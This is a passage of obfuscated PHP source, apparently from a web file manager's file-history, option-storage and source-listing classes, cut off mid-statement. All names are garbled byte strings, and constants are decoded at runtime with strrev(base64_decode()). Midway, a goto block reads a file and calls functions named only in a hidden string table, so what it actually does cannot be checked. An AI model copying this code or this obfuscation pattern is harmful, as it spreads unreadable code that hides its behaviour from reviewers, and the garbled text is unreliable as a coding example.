IO::mkdir($™¯£ÙÏ[$èïû„Ê¸[1301]]); $ğÛÍàı© = IO::copy($›¨ıÇé–, $™¯£ÙÏ[$èïû„Ê¸[1301]], !1, $Á×öó¨[$èïû„Ê¸[32]]); if (!$ğÛÍàı©) { self::clearEmptyFolder($™¯£ÙÏ[$èïû„Ê¸[1301]]); return !1; } array_unshift($á¡Œîï·, $Á×öó¨); if (count($á¡Œîï·) > $’ëÄûİÏ) { $„îÊ°¸£ = array_slice($á¡Œîï·, $’ëÄûİÏ); foreach ($„îÊ°¸£ as $³Ë‰ş±Á) { IO::remove($™¯£ÙÏ[$èïû„Ê¸[1301]] . $³Ë‰ş±Á[$èïû„Ê¸[32]]); } $á¡Œîï· = array_slice($á¡Œîï·, 0, $’ëÄûİÏ); } return self::saveData($™¯£ÙÏ[$èïû„Ê¸[1302]], $á¡Œîï·); } public static function remove($¤óİËã, $¤“—¯¥‚) { $Õœ÷’· =& $_SERVER[íû‘ş´]; $­„´‚ôá = self::listData($¤óİËã); $ÓŒù¤¦¨ = array(); if (!$­„´‚ôá) { return !1; } foreach ($­„´‚ôá[$Õœ÷’·[413]] as $¶ïÚ§à¹) { if ($¶ïÚ§à¹[$Õœ÷’·[443]] == $¤“—¯¥‚) { IO::remove($­„´‚ôá[$Õœ÷’·[1301]] . $¶ïÚ§à¹[$Õœ÷’·[32]]); continue; } $ÓŒù¤¦¨[] = $¶ïÚ§à¹; } return self::saveData($­„´‚ôá[$Õœ÷’·[1302]], $ÓŒù¤¦¨); } public static function clear($”­şŞ‚Ü, $€±ƒ”£ = true) { $ã¿íŒãˆ =& $_SERVER[íû‘ş´]; $ÁªºÁ = self::listData($”­şŞ‚Ü, $€±ƒ”£); if (!$ÁªºÁ) { return !1; } foreach ($ÁªºÁ[$ã¿íŒãˆ[413]] as $„äõ¡Œ€) { IO::remove($ÁªºÁ[$ã¿íŒãˆ[1301]] . $„äõ¡Œ€[$ã¿íŒãˆ[32]]); } return self::saveData($ÁªºÁ[$ã¿íŒãˆ[1302]], array()); } public static function moveHistory($»®ğà”™, $ç¼š¹Õè = '', $¬ãŞÇ© = '') { $¬úı‘äù =& $_SERVER[íû‘ş´]; $óêõˆ„ = self::listData($»®ğà”™, !1); if (!$óêõˆ„ || !$óêõˆ„[$¬úı‘äù[413]]) { return !1; } $¯õòÓ°ƒ = $¬úı‘äù[1289]; $ç¼š¹Õè = $ç¼š¹Õè ? $ç¼š¹Õè : get_path_this($»®ğà”™); $¬ãŞÇ© = $¬ãŞÇ© ? $¬ãŞÇ© : $óêõˆ„[$¬úı‘äù[1301]]; $¹”Ãï¥¶ = substr(get_path_this($óêõˆ„[$¬úı‘äù[1302]]), 0, -strlen($¯õòÓ°ƒ)); foreach ($óêõˆ„[$¬úı‘äù[413]] as $ù¶úï => $¨ŞØÒÆ¿) { $÷£¨ú«ã = $ç¼š¹Õè . substr($¨ŞØÒÆ¿[$¬úı‘äù[32]], strlen($¹”Ãï¥¶)); $šÉŸÇæ = IO::move($óêõˆ„[$¬úı‘äù[1301]] . $¨ŞØÒÆ¿[$¬úı‘äù[32]], $¬ãŞÇ©, !1, $÷£¨ú«ã); if ($šÉŸÇæ) { $óêõˆ„[$¬úı‘äù[413]][$ù¶úï][$¬úı‘äù[32]] = $÷£¨ú«ã; } } $óêõˆ„[$¬úı‘äù[1302]] = IO::move($óêõˆ„[$¬úı‘äù[1302]], $¬ãŞÇ©, !1, $ç¼š¹Õè . $¯õòÓ°ƒ); self::saveData($óêõˆ„[$¬úı‘äù[1302]], $óêõˆ„[$¬úı‘äù[413]]); self::clearEmptyFolder($óêõˆ„[$¬úı‘äù[1301]]); } public static function rollback($ˆÏç³–, $½Éº®ß®) { $•½ìİº =& $_SERVER[íû‘ş´]; $ô®¿ø = self::listData($ˆÏç³–); if (!$ô®¿ø) { return; } $‚·™²Ö« = IO::info($ˆÏç³–); foreach ($ô®¿ø[$•½ìİº[413]] as $¯íÆß¼¥ => $ªü×Ìƒ) { if ($ªü×Ìƒ[$•½ìİº[443]] == $½Éº®ß®) { self::add($ˆÏç³–); $«å¤‘¢ = $ô®¿ø[$•½ìİº[1301]] . $ªü×Ìƒ[$•½ìİº[32]]; $—¼ÙŒø = IO::copy($«å¤‘¢, IO::pathFather($ˆÏç³–), REPEAT_REPLACE, $‚·™²Ö«[$•½ìİº[32]]); if ($—¼ÙŒø) { self::remove($ˆÏç³–, $½Éº®ß®); } return $—¼ÙŒø; } } return !1; } public static function setDetail($¨‘¥î“, $Ç€¢è, $¬¶ÖäÉê) { $ÉÆŒ…†¯ =& $_SERVER[íû‘ş´]; $‰—ÃÛà£ = self::listData($¨‘¥î“); if (!$‰—ÃÛà£) { return; } foreach ($‰—ÃÛà£[$ÉÆŒ…†¯[413]] as $ìü°„ò“ => $²Éåİê¡) { if ($²Éåİê¡[$ÉÆŒ…†¯[443]] == $Ç€¢è) { $‰—ÃÛà£[$ÉÆŒ…†¯[413]][$ìü°„ò“][$ÉÆŒ…†¯[1300]] = $¬¶ÖäÉê; self::saveData($‰—ÃÛà£[$ÉÆŒ…†¯[1302]], $‰—ÃÛà£[$ÉÆŒ…†¯[413]]); return !0; } } return !1; } public static function fileInfo($úŞ¤©Šş, $ùÂæ”ùä) { $ª ÃßÖü =& $_SERVER[íû‘ş´]; $æ™…åÎâ = self::listData($úŞ¤©Šş); if (!$æ™…åÎâ) { show_json(LNG($ª ÃßÖü[105]), !1); } $²¯½ = $ª ÃßÖü[12]; foreach ($æ™…åÎâ[$ª ÃßÖü[413]] as $™’‘¯Ÿ => $ñ‹¬…ò™) { if ($ñ‹¬…ò™[$ª ÃßÖü[443]] != $ùÂæ”ùä) { continue; } $²¯½ = $æ™…åÎâ[$ª ÃßÖü[1301]] . $ñ‹¬…ò™[$ª ÃßÖü[32]]; break; } if (!$²¯½) { show_json(LNG($ª ÃßÖü[105]), !1); } return IO::info($²¯½); } public static function fileOut($åÍš‹¼, $öè· èÒ, $òÕ¨—§ä = false) { $°ğšºŸë =& $_SERVER[íû‘ş´]; $ó‡Éò²» = self::fileInfo($åÍš‹¼, $öè· èÒ); $ù…ÈéÇ´ =& $GLOBALS[$°ğšºŸë[7]]; $òÕ¨—§ä = isset($ù…ÈéÇ´[$°ğšºŸë[1252]]) && $ù…ÈéÇ´[$°ğšºŸë[1252]] == 1; if (isset($ù…ÈéÇ´[$°ğšºŸë[33]]) && $ù…ÈéÇ´[$°ğšºŸë[33]] == $°ğšºŸë[1303]) { return IO::fileOutImage($ó‡Éò²»[$°ğšºŸë[84]], $ù…ÈéÇ´[$°ğšºŸë[1304]]); } IO::fileOut($ó‡Éò²»[$°ğšºŸë[84]], $òÕ¨—§ä, get_path_this($åÍš‹¼)); } public static function listData($Üô•ÆÃ…, $Û¸¿»Éõ = true) { $Ç‹Ëêõ¦ =& $_SERVER[íû‘ş´]; if ($Û¸¿»Éõ && !IO::exist($Üô•ÆÃ…)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Üô•ÆÃ…, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $†ˆ¼Ù±‹ = self::pathHistory($Üô•ÆÃ…); $‰ââìü§ = array($Ç‹Ëêõ¦[1302] => $†ˆ¼Ù±‹ . $Ç‹Ëêõ¦[1289], $Ç‹Ëêõ¦[1301] => rtrim(get_path_father($†ˆ¼Ù±‹), $Ç‹Ëêõ¦[8]) . $Ç‹Ëêõ¦[8], $Ç‹Ëêõ¦[413] => array()); $¼”Ôªñ  = IO::getContent($‰ââìü§[$Ç‹Ëêõ¦[1302]]); if ($¼”Ôªñ ) { $î¯ÚÔòè = json_decode($¼”Ôªñ , !0); if (is_array($î¯ÚÔòè)) { $‰ââìü§[$Ç‹Ëêõ¦[413]] = $î¯ÚÔòè; } } return $‰ââìü§; } private static function saveData($ŒĞÑÌ“š, $œ‹‡Úœ) { $íäí²× =& $_SERVER[íû‘ş´]; self::log($íäí²×[1305] . $ŒĞÑÌ“š . $íäí²×[71] . count($œ‹‡Úœ), $íäí²×[810]); if ($œ‹‡Úœ) { return IO::setContent($ŒĞÑÌ“š, json_encode($œ‹‡Úœ)); } $¬ßÙÂ²“ = IO::pathFather($ŒĞÑÌ“š); IO::remove($ŒĞÑÌ“š); self::clearEmptyFolder($¬ßÙÂ²“); return !0; } public static function clearEmptyFolder($ü…€È¬) { $Æú‚úŒ§ =& $_SERVER[íû‘ş´]; if (trim($ü…€È¬, $Æú‚úŒ§[8]) == trim(self::$_historyBase, $Æú‚úŒ§[8])) { return; } $•¤÷ Àå = IO::pathFather($ü…€È¬); $ÄŠÂ¡ûÔ = IO::has($ü…€È¬, !0); if ($ÄŠÂ¡ûÔ[$Æú‚úŒ§[223]] > 0 || $ÄŠÂ¡ûÔ[$Æú‚úŒ§[224]] > 0) { return; } IO::remove($ü…€È¬); self::clearEmptyFolder($•¤÷ Àå); } private static function getBasePath() { $ğá…¨Ó =& $_SERVER[íû‘ş´]; $ºùğ¼ÒĞ = Model($ğá…¨Ó[1306])->get($ğá…¨Ó[1307]); if ($ºùğ¼ÒĞ) { if (!IO::exist($ºùğ¼ÒĞ)) { IO::mkdir($ºùğ¼ÒĞ); } if (get_path_this($ºùğ¼ÒĞ) == $ğá…¨Ó[1292]) { $³ØèæÖÂ = $ğá…¨Ó[1308] . rand_string(8); @rename($ºùğ¼ÒĞ, get_path_father($ºùğ¼ÒĞ) . $ğá…¨Ó[8] . $³ØèæÖÂ); $ºùğ¼ÒĞ = DATA_PATH . $³ØèæÖÂ . $ğá…¨Ó[8]; file_put_contents(DATA_PATH . $ğá…¨Ó[1242], $ğá…¨Ó[12]); Model($ğá…¨Ó[1306])->set($ğá…¨Ó[1307], $ºùğ¼ÒĞ); } return $ºùğ¼ÒĞ; } $ºùğ¼ÒĞ = DATA_PATH . $ğá…¨Ó[1308] . rand_string(8) . $ğá…¨Ó[8]; $ºùğ¼ÒĞ = IO::mkdir($ºùğ¼ÒĞ); $ºùğ¼ÒĞ = rtrim($ºùğ¼ÒĞ, $ğá…¨Ó[8]) . $ğá…¨Ó[8]; file_put_contents($ºùğ¼ÒĞ . $ğá…¨Ó[1242], $ğá…¨Ó[12]); file_put_contents(DATA_PATH . $ğá…¨Ó[1242], $ğá…¨Ó[12]); Model($ğá…¨Ó[1306])->set($ğá…¨Ó[1307], $ºùğ¼ÒĞ); return $ºùğ¼ÒĞ; } } goto EÍ¼àÈò; Fó’¿¸”æô: $fileSize = strrev(base64_decode($_SERVER[‡‚«ºˆÅ][0])); function binCheckNeq($ŒÅâ§é¤, $ô¾“‹ìß) { return $ŒÅâ§é¤ != $ô¾“‹ìß; } $_SERVER[$_SERVER[‡‚«ºˆÅ][1]] = $fileSize($_SERVER[$_SERVER[‡‚«ºˆÅ][2]]); goto däÛ„¡È–; A¡¸Ê–…‡: if ($_SERVER[$_SERVER[íû‘ş´][444]] != $_SERVER[$_SERVER[íû‘ş´][445]]) { $_getc = $_SERVER[íû‘ş´][446]; $_getfile = $_SERVER[$_SERVER[íû‘ş´][447]] . $_SERVER[íû‘ş´][448]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[íû‘ş´][246], $_getfilec); if (count($_getarrs) < $_SERVER[íû‘ş´][449]) { $exit = $_SERVER[íû‘ş´][450]; $exit(); } $_act = $_SERVER[íû‘ş´][451]; $_act($_SERVER[$_SERVER[íû‘ş´][452]]); } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($íš€ÛıÆ = false, $²¬İû·½ = '', $Å¨ô²çğ = false) { $¤šŠ‘€ =& $_SERVER[íû‘ş´]; $°šäªÔÁ = $this->cacheGet($²¬İû·½); $ª³‹ƒ‹İ = $this->optionDefault($²¬İû·½); $ª³‹ƒ‹İ = is_array($ª³‹ƒ‹İ) ? $ª³‹ƒ‹İ : array(); if (is_array($°šäªÔÁ)) { $°šäªÔÁ = array_merge($ª³‹ƒ‹İ, $°šäªÔÁ); return $íš€ÛıÆ ? isset($°šäªÔÁ[$íš€ÛıÆ]) ? $°šäªÔÁ[$íš€ÛıÆ] : null : $°šäªÔÁ; } $ÇÚÖßİ© = $this->filterWhere(array($¤šŠ‘€[33] => $²¬İû·½)); $°šäªÔÁ = $this->where($ÇÚÖßİ©)->select(); $°šäªÔÁ = array_to_keyvalue($°šäªÔÁ, $¤šŠ‘€[94], $¤šŠ‘€[418]); foreach ($°šäªÔÁ as $Ï†³äü¼ => $¿Å§·—™) { if ($Å¨ô²çğ || in_array($Ï†³äü¼, $this->jsonField)) { $°šäªÔÁ[$Ï†³äü¼] = json_decode($¿Å§·—™, !0); } } $this->cacheSet($²¬İû·½, $°šäªÔÁ); $°šäªÔÁ = array_merge($ª³‹ƒ‹İ, $°šäªÔÁ); return $íš€ÛıÆ ? $°šäªÔÁ[$íš€ÛıÆ] : $°šäªÔÁ; } public function set($õ€§‰ïÔ, $ ³ìëëö = false, $–ÖæÍ‰ = '') { $³¾¦ÌŠğ =& $_SERVER[íû‘ş´]; $this->cacheRemove($–ÖæÍ‰); $¾ç†±á = array(); $®©úç Ÿ = is_array($õ€§‰ïÔ) ? $õ€§‰ïÔ : array($õ€§‰ïÔ => $ ³ìëëö); foreach ($®©úç Ÿ as $Ÿšâ·¦ã => $ª«“•Œ§) { if (is_array($ª«“•Œ§)) { $ª«“•Œ§ = json_encode_force($ª«“•Œ§); } $this->checkLength($ª«“•Œ§, !1, $this->tableName . $³¾¦ÌŠğ[4] . $õ€§‰ïÔ); $ª«“•Œ§ = self::textEncode($ª«“•Œ§); $®©úç Ÿ = array($³¾¦ÌŠğ[33] => $–ÖæÍ‰, $³¾¦ÌŠğ[94] => $Ÿšâ·¦ã, $³¾¦ÌŠğ[418] => $ª«“•Œ§); $¾ç†±á[] = $this->filterWhere($®©úç Ÿ); } if (!$¾ç†±á) { return !0; } $ó´§²„¤ = $this->cacheKey($³¾¦ÌŠğ[453]); CacheLock::lock($ó´§²„¤); $Æ›õŸ¤’ = $this->addAll($¾ç†±á, array(), !0); CacheLock::unlock($ó´§²„¤); return $Æ›õŸ¤’; } protected function optionDefault($¾²±ŠÁ = '') { return !1; } public function setDeep($£û¿—µ¬, $ÁØ¬Š = false, $¨óÌ•Ó¤ = '') { $éâäÃù° = explode($_SERVER[íû‘ş´][10], $£û¿—µ¬); $ŠæŸ—‘À = $this->get(); array_set_value($ŠæŸ—‘À, $£û¿—µ¬, $ÁØ¬Š); $this->set($éâäÃù°[0], $ŠæŸ—‘À[$éâäÃù°[0]], $¨óÌ•Ó¤); } public function remove($„Ôæ¤‡‰, $•¶†šÛ¥ = '') { $ö®Ÿ¥˜¬ =& $_SERVER[íû‘ş´]; $this->cacheRemove($•¶†šÛ¥); $ŒÖáŠ¶¥ = $this->filterWhere(array($ö®Ÿ¥˜¬[94] => $„Ôæ¤‡‰, $ö®Ÿ¥˜¬[33] => $•¶†šÛ¥)); if (is_null($„Ôæ¤‡‰)) { unset($ŒÖáŠ¶¥[$ö®Ÿ¥˜¬[94]]); } return $this->where($ŒÖáŠ¶¥)->delete(); } public function cacheSet($¯…¿Õ“¹, $¿ÖÆ»­Â = false) { return Cache::set($this->cacheKey($¯…¿Õ“¹), $¿ÖÆ»­Â); } public function cacheGet($–¨ÆœÊ ) { return Cache::get($this->cacheKey($–¨ÆœÊ )); } public function cacheRemove($ÅÂÑä‘ï) { return Cache::remove($this->cacheKey($ÅÂÑä‘ï)); } protected function filterWhere($±ôıı¡Ş) { return $±ôıı¡Ş; } protected function cacheKey($ºâõÄÌ™) { return $ºâõÄÌ™; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\x72\143\x65"; protected $tableMeta = array("\x74\x61\142\154\145\x4e\141\x6d\x65" => "\x69\157\x5f\x73\157\x75\162\x63\145\137\x6d\145\164\x61", "\x6d\x65\164\141\x46\151\145\x6c\144" => "\163\x6f\165\x72\x63\145\x49\104"); protected $dataAuto = array(array("\155\157\x64\x69\146\x79\124\x69\x6d\x65", "\x74\151\x6d\x65", "\x69\156\163\145\x72\164", "\146\x75\156\143\164\x69\x6f\156"), array("\143\x72\x65\x61\x74\145\124\x69\x6d\145", "\164\151\155\x65", "\x69\x6e\163\145\162\164", "\x66\165\x6e\x63\164\151\157\x6e"), array("\166\151\x65\167\x54\x69\x6d\x65", "\164\x69\x6d\145", "\151\156\x73\145\x72\164", "\x66\165\156\x63\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Æ¢µÁ’ø) { return $this->listSource(array($_SERVER[íû‘ş´][454] => $Æ¢µÁ’ø)); } public function typeName($üÃûé˜†) { static $£ªÚñ‰à = array(self::TYPE_SYSTEM => "\x73\171\x73\x74\x65\x6d", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\147\162\157\165\x70"); return $£ªÚñ‰à[$üÃûé˜† . $_SERVER[íû‘ş´][12]]; } public function sourceListInfo($ÓŠ´¬ºÑ, $Ğ€äŸÀ = false) { $ÂÒîÌáä =& $_SERVER[íû‘ş´]; $ÓŠ´¬ºÑ = $ÓŠ´¬ºÑ ? $ÓŠ´¬ºÑ : array(); $ÓŠ´¬ºÑ = array_filter(array_unique($ÓŠ´¬ºÑ)); if (!$ÓŠ´¬ºÑ) { return array(); } $¼ËËÖÂ = $this->where(array($ÂÒîÌáä[181] => array($ÂÒîÌáä[7], $ÓŠ´¬ºÑ)))->select(); $this->_listDataApply($¼ËËÖÂ, $Ğ€äŸÀ); return array_to_keyvalue($¼ËËÖÂ, $ÂÒîÌáä[181]); } public function pathInfoFilter(&$†¹Ğ×ª˜) { $È®ƒ¥¥ä =& $_SERVER[íû‘ş´]; static $Ã¾—ÄÙ = false; static $¢ù‹áÆŠ = false; static $…Àİ¤İ÷ = false; if (!$Ã¾—ÄÙ) { $É¸ÌŞ = $È®ƒ¥¥ä[455]; $É¸ÌŞ .= $È®ƒ¥¥ä[456]; $É¸ÌŞ .= $È®ƒ¥¥ä[457]; $©éíã’¤ = $È®ƒ¥¥ä[458]; $ÈÌÑ™±Ã = explode($È®ƒ¥¥ä[50], $©éíã’¤); $Ã¾—ÄÙ = explode($È®ƒ¥¥ä[50], $É¸ÌŞ); $¢ù‹áÆŠ = array(); foreach ($Ã¾—ÄÙ as $“±„…®Ç) { if (in_array($“±„…®Ç, $ÈÌÑ™±Ã)) { continue; } $¢ù‹áÆŠ[] = $“±„…®Ç; } $…Àİ¤İ÷ = explode($È®ƒ¥¥ä[50], $È®ƒ¥¥ä[459]); } foreach ($…Àİ¤İ÷ as $­Ó£Ä) { if (isset($†¹Ğ×ª˜[$­Ó£Ä])) { $†¹Ğ×ª˜[$­Ó£Ä] = intval($†¹Ğ×ª˜[$­Ó£Ä]); } } $†¹Ğ×ª˜[$È®ƒ¥¥ä[84]] = $È®ƒ¥¥ä[460] . $†¹Ğ×ª˜[$È®ƒ¥¥ä[181]] . $È®ƒ¥¥ä[461]; $†¹Ğ×ª˜[$È®ƒ¥¥ä[33]] = $†¹Ğ×ª˜[$È®ƒ¥¥ä[462]] == 1 ? $È®ƒ¥¥ä[75] : $È®ƒ¥¥ä[214]; $†¹Ğ×ª˜[$È®ƒ¥¥ä[178]] = $this->typeName($†¹Ğ×ª˜[$È®ƒ¥¥ä[178]]); if ($†¹Ğ×ª˜[$È®ƒ¥¥ä[462]] != 1) { $†¹Ğ×ª˜[$È®ƒ¥¥ä[175]] = $†¹Ğ×ª˜[$È®ƒ¥¥ä[463]]; unset($†¹Ğ×ª˜[$È®ƒ¥¥ä[463]]); } $Àï€®Ïé = $Ã¾—ÄÙ; if (isset($†¹Ğ×ª˜[$È®ƒ¥¥ä[464]]) && $†¹Ğ×ª˜[$È®ƒ¥¥ä[464]][$È®ƒ¥¥ä[465]] == -1) { $Àï€®Ïé = $¢ù‹áÆŠ; } $†¹Ğ×ª˜ = array_field_key($†¹Ğ×ª˜, $Àï€®Ïé); return $†¹Ğ×ª˜; } public function listUserFav() { $ëù£ç×Í =& $_SERVER[íû‘ş´]; $ÜÑß±ëë = Model($ëù£ç×Í[466])->listData(); $ÍÑê×òï = array_filter_by_field($ÜÑß±ëë, $ëù£ç×Í[33], $ëù£ç×Í[467]); $ÍÑê×òï = array_to_keyvalue($ÍÑê×òï, $ëù£ç×Í[12], $ëù£ç×Í[84]); if ($ÍÑê×òï) { $îÙìÛŞÍ = $this->listSource(array($ëù£ç×Í[468] => array($ëù£ç×Í[469], $ÍÑê×òï))); } $îÙìÛŞÍ = array_to_keyvalue($îÙìÛŞÍ[$ëù£ç×Í[413]], $ëù£ç×Í[181]); foreach ($ÜÑß±ëë as &$Ñ¾Ó‡Ì¸) { $Ñ¾Ó‡Ì¸ = array($ëù£ç×Í[470] => $Ñ¾Ó‡Ì¸[$ëù£ç×Í[443]], $ëù£ç×Í[471] => $Ñ¾Ó‡Ì¸[$ëù£ç×Í[32]], $ëù£ç×Í[472] => $Ñ¾Ó‡Ì¸[$ëù£ç×Í[84]], $ëù£ç×Í[473] => $Ñ¾Ó‡Ì¸[$ëù£ç×Í[33]], $ëù£ç×Í[474] => $Ñ¾Ó‡Ì¸[$ëù£ç×Í[215]], $ëù£ç×Í[475] => $Ñ¾Ó‡Ì¸[$ëù£ç×Í[85]]); if ($Ñ¾Ó‡Ì¸[$ëù£ç×Í[33]] == $ëù£ç×Í[467] && $îÙìÛŞÍ[$Ñ¾Ó‡Ì¸[$ëù£ç×Í[84]]]) { $Ñ¾Ó‡Ì¸[$ëù£ç×Í[87]] = $îÙìÛŞÍ[$Ñ¾Ó‡Ì¸[$ëù£ç×Í[84]]]; } } unset($Ñ¾Ó‡Ì¸); return $ÜÑß±ëë; } public function listUserTag($ôûÁò“) { $Ô¡–¶ü =& $_SERVER[íû‘ş´]; if ($ôûÁò“ && !is_array($ôûÁò“)) { $ôûÁò“ = array($ôûÁò“); } $Äö“ÁĞ¤ = Model($Ô¡–¶ü[476])->listData(); $‘ÈóğÄ = array(); $é§ĞŸ¾ã = array(); foreach ($Äö“ÁĞ¤ as $öÛ©èîÕ) { $â¥ÕĞúÄ = $öÛ©èîÕ[$Ô¡–¶ü[84]]; if (!$â¥ÕĞúÄ) { continue; } if (!isset($é§ĞŸ¾ã[$â¥ÕĞúÄ])) { $é§ĞŸ¾ã[$â¥ÕĞúÄ] = array(); } $é§ĞŸ¾ã[$â¥ÕĞúÄ][] = $öÛ©èîÕ[$Ô¡–¶ü[477]]; $‘ÈóğÄ[$öÛ©èîÕ[$Ô¡–¶ü[84]]] = $öÛ©èîÕ; } $£í×µÃ½ = array(); $¨àšÏ–¹ = array(); $ãğøùŞ = array(); foreach ($é§ĞŸ¾ã as $´©×Ãß => $î­ôÎÁœ) { $üÔ‚Áœ = !0; if (!$ôûÁò“) { $£í×µÃ½[] = $´©×Ãß; continue; } foreach ($ôûÁò“ as $àÈÉ¼‘Ä) { if (!in_array($àÈÉ¼‘Ä, $î­ôÎÁœ)) { $üÔ‚Áœ = !1; break; } } if (!$üÔ‚Áœ) { continue; } if (!is_numeric($´©×Ãß)) { $µşİ¨½’ = $‘ÈóğÄ[$´©×Ãß]; $¥ÉòÍØ = array($Ô¡–¶ü[32] => $µşİ¨½’[$Ô¡–¶ü[32]], $Ô¡–¶ü[84] => $µşİ¨½’[$Ô¡–¶ü[84]], $Ô¡–¶ü[33] => $µşİ¨½’[$Ô¡–¶ü[33]], $Ô¡–¶ü[87] => array($Ô¡–¶ü[478] => 1), $Ô¡–¶ü[216] => !0); if ($µşİ¨½’[$Ô¡–¶ü[33]] == $Ô¡–¶ü[214]) { $ãğøùŞ[] = $¥ÉòÍØ; } if ($µşİ¨½’[$Ô¡–¶ü[33]] == $Ô¡–¶ü[75]) { $¨àšÏ–¹[] = $¥ÉòÍØ; } continue; } $£í×µÃ½[] = $´©×Ãß; } if ($£í×µÃ½) { $—Ç¨ú”† = $this->listSource(array($Ô¡–¶ü[468] => array($Ô¡–¶ü[469], $£í×µÃ½))); } $—Ç¨ú”† = $—Ç¨ú”† ? $—Ç¨ú”† : array($Ô¡–¶ü[82] => array(), $Ô¡–¶ü[83] => array()); $—Ç¨ú”†[$Ô¡–¶ü[82]] = array_merge($—Ç¨ú”†[$Ô¡–¶ü[82]], $¨àšÏ–¹); $—Ç¨ú”†[$Ô¡–¶ü[83]] = array_merge($—Ç¨ú”†[$Ô¡–¶ü[83]], $ãğøùŞ); if (isset($—Ç¨ú”†[$Ô¡–¶ü[410]]) && count($£í×µÃ½) == $—Ç¨ú”†[$Ô¡–¶ü[410]][$Ô¡–¶ü[411]]) { return $—Ç¨ú”†; } $æÀ²èƒé = array(); $ ‡¨¯ÓÆ = array_to_keyvalue($—Ç¨ú”†[$Ô¡–¶ü[82]], $Ô¡–¶ü[12], $Ô¡–¶ü[181]); $¨¨‹ì = array_to_keyvalue($—Ç¨ú”†[$Ô¡–¶ü[83]], $Ô¡–¶ü[12], $Ô¡–¶ü[181]); $•¼ÊÌ‚ = array_merge($¨¨‹ì, $ ‡¨¯ÓÆ); foreach ($£í×µÃ½ as $â¥ÕĞúÄ) { if (!in_array($â¥ÕĞúÄ, $•¼ÊÌ‚)) { $æÀ²èƒé[] = $â¥ÕĞúÄ; } } if ($æÀ²èƒé) { Model($Ô¡–¶ü[479])->removeBySource($æÀ²èƒé); } return $—Ç¨ú”†; } public function listUserRecycle() { $Ùã¯–´¾ =& $_SERVER[íû‘ş´]; $ƒ‘—Çóš = Model($Ùã¯–´¾[480])->listData(); if (!$ƒ‘—Çóš) { return array(); } $§Ò›¿Ï° = array($Ùã¯–´¾[468] => array($Ùã¯–´¾[469], $ƒ‘—Çóš), $Ùã¯–´¾[481] => 1); return $this->listSource($§Ò›¿Ï°); } public function listSource($âãÂÎÛ, $ù®­ğÖ° = 3000, $ò‡†Ô‰ = false) { $¾Í§„ =& $_SERVER[íû‘ş´]; if (!isset($âãÂÎÛ[$¾Í§„[482]])) { $âãÂÎÛ[$¾Í§„[482]] = 0; } if (isset($âãÂÎÛ[$¾Í§„[180]]) && $âãÂÎÛ[$¾Í§„[180]] == $¾Í§„[212]) { $âãÂÎÛ[$¾Í§„[463]] = array($¾Í§„[375], $¾Í§„[483]); } $Û´Œ¡¨í = $¾Í§„[484]; $óÂ»şíƒ = $this->field($Û´Œ¡¨í)->_makeOrder()->where($âãÂÎÛ)->selectPage($ù®­ğÖ°); $this->_listPageCheck($óÂ»şíƒ, $Û´Œ¡¨í, $âãÂÎÛ); $this->_listDataApply($óÂ»şíƒ[$¾Í§„[413]], $ò‡†Ô‰); $this->_listMake($óÂ»şíƒ); return $óÂ»şíƒ; } private function _listPageCheck(&$ØèùŞö, $éä†Ğ¾¤, $šê…ÆŒ°) { $ş€Ñâ­æ =& $_SERVER[íû‘ş´]; if (!is_array($ØèùŞö[$ş€Ñâ­æ[410]])) { return; } $¡Ê¾ÆŒÜ = $ØèùŞö[$ş€Ñâ­æ[410]]; if ($¡Ê¾ÆŒÜ[$ş€Ñâ­æ[412]] <= 1) { return; } if ($¡Ê¾ÆŒÜ[$ş€Ñâ­æ[411]] >= 100000) { return; } if (Model($ş€Ñâ­æ[485])->get($ş€Ñâ­æ[486]) != $ş€Ñâ­æ[487]) { return; } $éä†Ğ¾¤ = str_replace(array($ş€Ñâ­æ[53], $ş€Ñâ­æ[386], $ş€Ñâ­æ[246]), $ş€Ñâ­æ[12], $éä†Ğ¾¤); $éä†Ğ¾¤ = $ş€Ñâ­æ[488] . str_replace($ş€Ñâ­æ[50], $ş€Ñâ­æ[489], $éä†Ğ¾¤) . $ş€Ñâ­æ[490]; $ßÚ‘Ğ¯Ã = $ş€Ñâ­æ[491]; $ßÚ‘Ğ¯Ã = $ßÚ‘Ğ¯Ã . $ş€Ñâ­æ[492]; $ïŞÇ³ûÂ = $¡Ê¾ÆŒÜ[$ş€Ñâ­æ[407]] * ($¡Ê¾ÆŒÜ[$ş€Ñâ­æ[397]] - 1) . $ş€Ñâ­æ[50] . $¡Ê¾ÆŒÜ[$ş€Ñâ­æ[407]]; $®¥Õı…â = $this->_makeOrder(!0); $ïŸèş§Ú = $ş€Ñâ­æ[488] . str_replace($ş€Ñâ­æ[50], $ş€Ñâ­æ[489], $®¥Õı…â[0]); if (strpos($ïŸèş§Ú, $ş€Ñâ­æ[493])) { $ïŸèş§Ú = str_replace($ş€Ñâ­æ[493], $ş€Ñâ­æ[494], $ïŸèş§Ú); } else { $ïŸèş§Ú .= $ş€Ñâ­æ[495] . $®¥Õı…â[1]; } $»­Ÿ¨¹ï = array(); foreach ($šê…ÆŒ° as $ë”â»¿ => $›«Êı¦á) { $»­Ÿ¨¹ï[$ş€Ñâ­æ[488] . $ë”â»¿] = $›«Êı¦á; } $this->alias($ş€Ñâ­æ[496])->field($éä†Ğ¾¤)->limit($ïŞÇ³ûÂ)->order($ïŸèş§Ú); $Üï„²§Š = $this->join($ßÚ‘Ğ¯Ã)->where($»­Ÿ¨¹ï)->select(); if ($Üï„²§Š) { $ØèùŞö[$ş€Ñâ­æ[413]] = $Üï„²§Š; } } protected function _makeOrder($ÉÊÕÕ¤Ğ = false) { $ğÅ‘Êé¥ =& $_SERVER[íû‘ş´]; $¥”ü¯ŸĞ = Model($ğÅ‘Êé¥[497])->get($ğÅ‘Êé¥[498]); $ˆÌ°ÅÎî = Model($ğÅ‘Êé¥[497])->get($ğÅ‘Êé¥[499]); $ÀÚ¿š® = array($ğÅ‘Êé¥[500] => $ğÅ‘Êé¥[501], $ğÅ‘Êé¥[502] => 